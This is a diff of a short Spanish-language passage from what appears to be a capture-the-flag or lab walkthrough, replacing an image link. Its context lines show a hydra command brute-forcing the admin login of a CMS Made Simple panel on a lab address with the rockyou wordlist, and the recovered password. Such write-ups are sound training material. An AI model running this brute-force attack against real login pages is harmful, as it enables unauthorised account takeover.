@@ -40,7 +40,8 @@ hacemos un ataque de fuerza bruta:
 
     - hydra -l admin -P /usr/share/wordlists/rockyou.txt  "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"  
 
-![[fuerza bruta.png]]
+![image](https://github.com/user-attachments/assets/6d2f3c8e-5ace-4a65-a55d-efcfe4078650)
+
 
 y nos da la contraseña "chocolate" para admin
 probamos en el panel de login
